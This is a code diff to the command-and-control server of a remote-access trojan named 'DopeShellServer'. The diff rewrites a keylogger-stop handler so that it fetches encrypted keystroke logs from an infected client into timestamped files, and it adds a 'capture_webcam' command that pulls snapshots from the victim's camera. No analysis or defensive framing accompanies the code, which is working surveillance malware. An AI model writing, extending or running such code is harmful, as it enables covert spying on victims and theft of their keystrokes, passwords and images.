@@ -127,15 +127,12 @@ class DopeShellServer:
 
             
             elif command.lower() == 'keylogger_stop':
-                file_data = b""
-                while True:
-                    chunk = client_socket.recv(4096)
-                    if b'EOF' in chunk:
-                        file_data += chunk[:chunk.index(b'EOF')]
-                        break
-                    file_data += chunk
-
-                with open("keylogs.txt", "wb") as f:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                now = datetime.now()
+                # Format the timestamp as dd-mm-yyyy-hh-mm-ss
+                timestamp = now.strftime("%d-%m-%Y-%H-%M-%S")
+                with open(f"keylogs{timestamp}.txt", "wb") as f:
+                    file_data = self.receive_data(client_socket)
                     f.write(file_data)
 
                 print("[+] Keylogs received and saved to keylogs.txt.")
@@ -157,6 +154,18 @@ class DopeShellServer:
                 print(help_text)
                 client_socket.send(self.encrypt(help_text.encode('utf-8')))
                 continue
+            
+            elif command.lower().startswith('capture_webcam'):
+                client_socket.send(self.encrypt(b"capture_webcam"))
+                now = datetime.now()
+                # Format the timestamp as dd-mm-yyyy-hh-mm-ss
+                timestamp = now.strftime("%d-%m-%Y-%H-%M-%S")
+                with open('snapshot' + timestamp+'.png', 'wb') as f:
+                    file_data = self.receive_data(client_socket)
+                    f.write(file_data)
+
+                print(f"[+] Downloaded Screenshot from the client as screenshot.png")
+
 
             elif command.lower().startswith('download'):
                 _, remote_path = command.split()
